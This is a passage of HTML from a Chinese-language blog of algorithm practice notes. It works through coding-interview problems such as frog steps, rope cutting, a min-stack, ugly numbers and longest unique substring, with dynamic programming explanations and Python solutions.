<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">lastRemaining</span>(<span class="params">self, n: <span class="built_in">int</span>, m: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span></span><br><span class="line">        dp = [<span class="number">0</span>] * (n+<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,n+<span class="number">1</span>):</span><br><span class="line">            dp[i] = (dp[i-<span class="number">1</span>] + m) % i</span><br><span class="line">        <span class="keyword">return</span> dp[n]</span><br></pre></td></tr></table></div></figure>


        <h2 id="青蛙跳台阶问题"   >
          <a href="#青蛙跳台阶问题" class="heading-link"><i class="fas fa-link"></i></a><a href="#青蛙跳台阶问题" class="headerlink" title="青蛙跳台阶问题"></a>青蛙跳台阶问题</h2>
      <p>即类似之前的合并问题，<strong>把数字翻译成字符串</strong></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221018215836305.png" alt="image-20221018215836305"></p>
<p>即推导一下，设每个台阶为1，每两个1台阶相邻可以选择合并为一个2台阶，那么假定如下台阶</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">11111 选择合并之后总数为dp(5)</span><br></pre></td></tr></table></div></figure>

<p>此时如果加入一级台阶，有两种情况</p>
<ul>
<li>与前一个台阶合并：<code>1111 2</code></li>
<li>不合并：<code>11111 1</code></li>
</ul>
<p>即<code>dp(6) = dp(4) + dp(5)</code>，由此可得动态规划</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dp(0) = 1</span><br><span class="line">dp(1) = 1</span><br><span class="line">dp(2) = dp(0) + dp(1) = 2</span><br><span class="line">dp(n) = dp(n-1) + dp(n-2)</span><br></pre></td></tr></table></div></figure>

<p>依据动态规划得到解</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">numWays</span>(<span class="params">self, n: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span></span><br><span class="line">        <span class="keyword">if</span>(n == <span class="number">0</span> <span class="keyword">or</span> n == <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">        dp = [<span class="number">0</span>] * (n+<span class="number">1</span>)</span><br><span class="line">        dp[<span class="number">0</span>] = <span class="number">1</span></span><br><span class="line">        dp[<span class="number">1</span>] = <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,n+<span class="number">1</span>):</span><br><span class="line">            dp[i] = dp[i-<span class="number">1</span>] + dp[i-<span class="number">2</span>]</span><br><span class="line">        <span class="keyword">return</span> dp[n] % <span class="number">1000000007</span></span><br></pre></td></tr></table></div></figure>


        <h2 id="剪绳子"   >
          <a href="#剪绳子" class="heading-link"><i class="fas fa-link"></i></a><a href="#剪绳子" class="headerlink" title="剪绳子"></a>剪绳子</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221019112511996.png" alt="image-20221019112511996"></p>
<p>可用动态规划，dp[n]为将长度为n的绳子拆分为至少两截之后的乘积。假定将绳子拆分为<code>j</code>和剩下的<code>n-j</code>，那么如下</p>
<ul>
<li><p>将<code>n</code>拆分成j和<code>n-j</code>的和，且<code>n-j</code>不再拆分成多个正整数，此时的乘积是<code>dp[n] = j * (n-j)</code></p>
</li>
<li><p>将<code>n</code>拆分成j和<code>n-j</code>的和，且<code>n-j</code>可以拆分成多个正整数，此时的乘积是<code>dp[n] = j * dp[n-j]</code></p>
</li>
</ul>
<p>综上可得如下结果</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dp[n] = j * max(n-j,dp[n-j])</span><br></pre></td></tr></table></div></figure>

<p>然后定义初始状态</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dp[0] = 0</span><br><span class="line">dp[1] = 0</span><br><span class="line">dp[2] = 1</span><br></pre></td></tr></table></div></figure>

<p>可得最终代码</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">cuttingRope</span>(<span class="params">self, n: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span></span><br><span class="line">        dp = [<span class="number">0</span>] * (n+<span class="number">1</span>)</span><br><span class="line">        dp[<span class="number">0</span>] = <span class="number">0</span></span><br><span class="line">        dp[<span class="number">1</span>] = <span class="number">0</span></span><br><span class="line">        dp[<span class="number">2</span>] = <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span>(n == <span class="number">0</span> <span class="keyword">or</span> n == <span class="number">1</span> <span class="keyword">or</span> n == <span class="number">2</span>):</span><br><span class="line">            <span class="keyword">return</span> dp[n]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>,n+<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,i):</span><br><span class="line">                dp[i] = <span class="built_in">max</span>(dp[i],j*(i-j),j*dp[i-j])</span><br><span class="line">        <span class="keyword">return</span> dp[n]</span><br></pre></td></tr></table></div></figure>

<p>需要注意的是，遍历j的过程中，由于<code>dp[i]</code>会被重复计算，所以需要把<code>dp[i]</code>也加入进行判断，防止最大值被覆盖。</p>

        <h2 id="包含min函数的栈"   >
          <a href="#包含min函数的栈" class="heading-link"><i class="fas fa-link"></i></a><a href="#包含min函数的栈" class="headerlink" title="包含min函数的栈"></a>包含min函数的栈</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221019151036307.png" alt="image-20221019151036307"></p>
<p>定义辅助栈，存放非严格递减元素，参考</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://leetcode.cn/problems/bao-han-minhan-shu-de-zhan-lcof/solution/mian-shi-ti-30-bao-han-minhan-shu-de-zhan-fu-zhu-z/" >面试题30. 包含 min 函数的栈（辅助栈，清晰图解） - 包含min函数的栈 - 力扣（LeetCode）</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/f31f4b7f5e91d46ea610b6685c593e12bf798a9b8336b0560b6b520956dd5272-Picture1.png" alt="img"></p>
<p>然后在<code>pop</code>和<code>push</code>函数中进行一下判断即可</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MinStack</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.stackA, self.stackB = [], []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">push</span>(<span class="params">self, x: <span class="built_in">int</span></span>) -&gt; <span class="literal">None</span>:</span></span><br><span class="line">        self.stackA.append(x)</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">len</span>(self.stackB) == <span class="number">0</span> <span class="keyword">or</span> self.stackB[-<span class="number">1</span>] &gt;= x):</span><br><span class="line">            self.stackB.append(x)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">pop</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:</span></span><br><span class="line">        tmp = self.stackA.pop()</span><br><span class="line">        <span class="keyword">if</span>(tmp == self.stackB[-<span class="number">1</span>]):</span><br><span class="line">            self.stackB.pop()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">top</span>(<span class="params">self</span>) -&gt; <span class="built_in">int</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.stackA[-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">min</span>(<span class="params">self</span>) -&gt; <span class="built_in">int</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.stackB[-<span class="number">1</span>]</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>




        <h2 id="调整数组顺序使奇数位于偶数前面"   >
          <a href="#调整数组顺序使奇数位于偶数前面" class="heading-link"><i class="fas fa-link"></i></a><a href="#调整数组顺序使奇数位于偶数前面" class="headerlink" title="调整数组顺序使奇数位于偶数前面"></a>调整数组顺序使奇数位于偶数前面</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221019152724383.png" alt="image-20221019152724383"></p>
<p>双指针或直接新数组</p>
<ul>
<li>新数组</li>
</ul>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">exchange</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="type">List</span>[<span class="built_in">int</span>]:</span></span><br><span class="line">        newJiNums = []</span><br><span class="line">        newOuNums = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> nums:</span><br><span class="line">            <span class="keyword">if</span>(i % <span class="number">2</span> == <span class="number">1</span>):</span><br><span class="line">                newJiNums.append(i)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                newOuNums.append(i)</span><br><span class="line">        <span class="keyword">return</span> newJiNums + newOuNums</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>

<ul>
<li>双指针</li>
</ul>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">exchange</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="type">List</span>[<span class="built_in">int</span>]:</span></span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        j = <span class="built_in">len</span>(nums) - <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span>(i &lt; j):</span><br><span class="line">            <span class="keyword">while</span>(i &lt; j <span class="keyword">and</span> nums[i] % <span class="number">2</span> == <span class="number">1</span>):</span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">            <span class="keyword">while</span>(i &lt; j <span class="keyword">and</span> nums[j] % <span class="number">2</span> == <span class="number">0</span>):</span><br><span class="line">                j -= <span class="number">1</span></span><br><span class="line">            nums[i],nums[j] = nums[j],nums[i]</span><br><span class="line">        <span class="keyword">return</span> nums</span><br></pre></td></tr></table></div></figure>




        <h2 id="丑数"   >
          <a href="#丑数" class="heading-link"><i class="fas fa-link"></i></a><a href="#丑数" class="headerlink" title="丑数"></a>丑数</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221020143110808.png" alt="image-20221020143110808"></p>
<p>刚开始想着行不行保存状态，a,b,c保存状态，初始化为0，然后每次将这三个数尝试递增之后，计算<code>tmp = min((a+1)*2,(b+1)*3,(c+1)*5)</code>，然后取最小值，之后再判断是哪一个，将对应的<code>a/b/c</code>加一即可。</p>
<p>然后由于<code>a+1/b+1/c+1</code>可能会出现包含除2,3,5之外的质因子，所以需要进行判断，判断其最大的质因子是否大于5即可，如果大于5，则不能要这个数。</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_num_factors</span>(<span class="params">self,num</span>):</span></span><br><span class="line">        hashSet = <span class="built_in">set</span>()</span><br><span class="line">        tmp = <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span>(num &lt; tmp):</span><br><span class="line">            <span class="keyword">return</span> []</span><br><span class="line">        <span class="keyword">while</span> (num &gt;= tmp):</span><br><span class="line">            k = num % tmp</span><br><span class="line">            <span class="keyword">if</span> (k == <span class="number">0</span>):</span><br><span class="line">                hashSet.add(tmp)</span><br><span class="line">                num = num / tmp  <span class="comment"># 更新</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                tmp = tmp + <span class="number">1</span>  <span class="comment"># 同时更新除数值，不必每次都从头开始</span></span><br><span class="line">        hashList = <span class="built_in">list</span>(hashSet)</span><br><span class="line">        <span class="keyword">return</span> hashList</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">nthUglyNumber</span>(<span class="params">self, n: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span></span><br><span class="line">        a,b,c = <span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span></span><br><span class="line">        tmp = [<span class="number">2</span>,<span class="number">3</span>,<span class="number">5</span>]</span><br><span class="line">        dp = [<span class="number">1</span>] * (n+<span class="number">1</span>)</span><br><span class="line">        i = <span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span>(i &lt; n+<span class="number">1</span>):</span><br><span class="line">            flag = <span class="number">0</span></span><br><span class="line">            tmp = <span class="built_in">min</span>((a+<span class="number">1</span>)*<span class="number">2</span>,(b+<span class="number">1</span>)*<span class="number">3</span>,(c+<span class="number">1</span>)*<span class="number">5</span>)</span><br><span class="line">            <span class="keyword">if</span>(tmp == (a+<span class="number">1</span>)*<span class="number">2</span>):</span><br><span class="line">                tmpList = self.get_num_factors(a+<span class="number">1</span>)</span><br><span class="line">                tmpList.sort()</span><br><span class="line">                <span class="keyword">if</span>(<span class="built_in">len</span>(tmpList) &gt; <span class="number">0</span> <span class="keyword">and</span> tmpList[-<span class="number">1</span>] &gt; <span class="number">5</span>):</span><br><span class="line">                    a += <span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">if</span>(<span class="keyword">not</span> flag):</span><br><span class="line">                        i += <span class="number">1</span></span><br><span class="line">                        flag = <span class="number">1</span></span><br><span class="line">                    a += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(tmp == (b+<span class="number">1</span>)*<span class="number">3</span>):</span><br><span class="line">                tmpList = self.get_num_factors(b+<span class="number">1</span>)</span><br><span class="line">                tmpList.sort()</span><br><span class="line">                <span class="keyword">if</span>(<span class="built_in">len</span>(tmpList) &gt; <span class="number">0</span> <span class="keyword">and</span> tmpList[-<span class="number">1</span>] &gt; <span class="number">5</span>):</span><br><span class="line">                    b += <span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">if</span>(<span class="keyword">not</span> flag):</span><br><span class="line">                        i += <span class="number">1</span></span><br><span class="line">                        flag = <span class="number">1</span></span><br><span class="line">                    b += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span>(tmp == (c+<span class="number">1</span>)*<span class="number">5</span>):</span><br><span class="line">                tmpList = self.get_num_factors(c+<span class="number">1</span>)</span><br><span class="line">                tmpList.sort()</span><br><span class="line">                <span class="keyword">if</span>(<span class="built_in">len</span>(tmpList) &gt; <span class="number">0</span> <span class="keyword">and</span> tmpList[-<span class="number">1</span>] &gt; <span class="number">5</span>):</span><br><span class="line">                    c += <span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">if</span>(<span class="keyword">not</span> flag):</span><br><span class="line">                        i += <span class="number">1</span></span><br><span class="line">                        flag = <span class="number">1</span></span><br><span class="line">                    c += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span>(flag):</span><br><span class="line">                dp[i-<span class="number">1</span>] = tmp</span><br><span class="line">        <span class="keyword">return</span> dp[n]</span><br></pre></td></tr></table></div></figure>

<p>时间复杂度为<code>O(n^2)</code>，会超时，后面看题解用动态规划才行，参考</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://leetcode.cn/problems/chou-shu-lcof/solution/mian-shi-ti-49-chou-shu-dong-tai-gui-hua-qing-xi-t/" >剑指 Offer 49. 丑数（动态规划，清晰图解） - 丑数 - 力扣（LeetCode）</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>需要明确一点就是，所有的丑数都是前面的某个丑数乘以某个数得到的，这个某个数也必定是某个丑数，不然就会存在非1,2,3,5的质因子了。</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">nthUglyNumber</span>(<span class="params">self, n: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span></span><br><span class="line">        state = [<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line">        dp = [<span class="number">1</span>] * (n + <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,n+<span class="number">1</span>):</span><br><span class="line">            dp[i] = <span class="built_in">min</span>(dp[state[<span class="number">0</span>]+<span class="number">1</span>]*<span class="number">2</span>,dp[state[<span class="number">1</span>]+<span class="number">1</span>]*<span class="number">3</span>,dp[state[<span class="number">2</span>]+<span class="number">1</span>]*<span class="number">5</span>)</span><br><span class="line">            <span class="keyword">if</span>(dp[i] == dp[state[<span class="number">0</span>]+<span class="number">1</span>]*<span class="number">2</span>):</span><br><span class="line">                state[<span class="number">0</span>] += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span>(dp[i] == dp[state[<span class="number">1</span>]+<span class="number">1</span>]*<span class="number">3</span>):</span><br><span class="line">                state[<span class="number">1</span>] += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span>(dp[i] == dp[state[<span class="number">2</span>]+<span class="number">1</span>]*<span class="number">5</span>):</span><br><span class="line">                state[<span class="number">2</span>] += <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> dp[n]</span><br></pre></td></tr></table></div></figure>


        <h2 id="股票的最大利润"   >
          <a href="#股票的最大利润" class="heading-link"><i class="fas fa-link"></i></a><a href="#股票的最大利润" class="headerlink" title="股票的最大利润"></a>股票的最大利润</h2>
      <p>和之前的<strong>买卖股票最佳时机</strong>一样</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">class Solution:</span><br><span class="line">    def maxProfit(self, prices: List[int]) -&gt; int:</span><br><span class="line">        minIdx = 0</span><br><span class="line">        maxBenefit = 0</span><br><span class="line">        for i in range(0,len(prices)):</span><br><span class="line">            if(prices[i] &lt; prices[minIdx]):</span><br><span class="line">                minIdx = i</span><br><span class="line">            maxBenefit = max(maxBenefit,prices[i] - prices[minIdx])</span><br><span class="line">        return maxBenefit</span><br></pre></td></tr></table></div></figure>

<p>不过这次分析一下动态规划，参考<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://leetcode.cn/problems/gu-piao-de-zui-da-li-run-lcof/solution/mian-shi-ti-63-gu-piao-de-zui-da-li-run-dong-tai-2/" >面试题63. 股票的最大利润（动态规划，清晰图解） - 股票的最大利润 - 力扣（LeetCode）</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>假定<code>dp[i]</code>代表以<code>prices[i]</code>为结尾的子数组的最大利润，则可推导得到动态转换方程</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">前i日最大利润=max(前(i−1)日最大利润,第i日价格−前i日最低价格)</span><br><span class="line">dp[i] = max(dp[i-1],prices[i]-min(prices[0:i]))</span><br></pre></td></tr></table></div></figure>

<p>依据动态转换方程求得最终代码</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">maxProfit</span>(<span class="params">self, prices: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="built_in">int</span>:</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">len</span>(prices) == <span class="number">0</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        minIdx = <span class="number">0</span></span><br><span class="line">        dp = [<span class="number">0</span>] * <span class="built_in">len</span>(prices)</span><br><span class="line">        dp[<span class="number">0</span>] = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="built_in">len</span>(prices)):</span><br><span class="line">            <span class="keyword">if</span>(prices[i] &lt; prices[minIdx]):</span><br><span class="line">                minIdx = i</span><br><span class="line">            dp[i] = <span class="built_in">max</span>(dp[i-<span class="number">1</span>],prices[i] - prices[minIdx])</span><br><span class="line">        <span class="keyword">return</span> dp[<span class="built_in">len</span>(prices)-<span class="number">1</span>]</span><br></pre></td></tr></table></div></figure>




        <h2 id="最长不含重复字符的子字符串"   >
          <a href="#最长不含重复字符的子字符串" class="heading-link"><i class="fas fa-link"></i></a><a href="#最长不含重复字符的子字符串" class="headerlink" title="最长不含重复字符的子字符串"></a>最长不含重复字符的子字符串</h2>
      <p>参考之前的<strong>无重复字符的最长子串</strong>，使用<strong>滑动窗口+哈希</strong></p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">lengthOfLongestSubstring</span>(<span class="params">self, s: <span class="built_in">str</span></span>) -&gt; <span class="built_in">int</span>:</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">len</span>(s) == <span class="number">0</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">        i,j=<span class="number">0</span>,<span class="number">0</span></span><br><span class="line">        tmpS = <span class="string">&quot;&quot;</span></span><br><span class="line">        maxLen = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span>(j &lt; <span class="built_in">len</span>(s)):</span><br><span class="line">            <span class="keyword">if</span>(s[j] <span class="keyword">in</span> tmpS):</span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">            j += <span class="number">1</span></span><br><span class="line">            tmpS = s[i:j]</span><br><span class="line">            <span class="keyword">while</span>(<span class="built_in">len</span>(<span class="built_in">set</span>(tmpS)) != <span class="built_in">len</span>(tmpS)):</span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">                tmpS = s[i:j]</span><br><span class="line">            maxLen = <span class="built_in">max</span>(maxLen,j-i)</span><br></pre></td></tr></table></div></figure>

<p>或者使用<strong>动态规划+哈希</strong></p>
<p>假定<code>dp[i]</code>为以<code>s[0:i]</code>这个子字符串的无重复字符的最长字串长度，当加入一个字符，即对于<code>dp[i+1]</code>而言，如果加入的字符<code>s[i+1]</code>可以和前面<code>s[i-dp[i-1]:i]</code>组成无重复的子字符串，那么<code>dp[i+1] = dp[i] + 1</code>，否则<code>dp[i+1] = dp[i]</code></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">判断加入字符是否可以和前面dp[i-1]个字符串组成无重复子串,推导得到下面的状态转换方程</span><br><span class="line">dp[i] = dp[i-1]</span><br><span class="line">      = dp[i-1] + 1</span><br></pre></td></tr></table></div></figure>

<p>初始状态：<code>dp[0] = 1</code></p>
<p>依据状态转换方程可得代码</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">lengthOfLongestSubstring</span>(<span class="params">self, s: <span class="built_in">str</span></span>) -&gt; <span class="built_in">int</span>:</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">len</span>(s) == <span class="number">0</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">len</span>(s) == <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">        dp = [<span class="number">0</span>] * (<span class="built_in">len</span>(s))</span><br><span class="line">        dp[<span 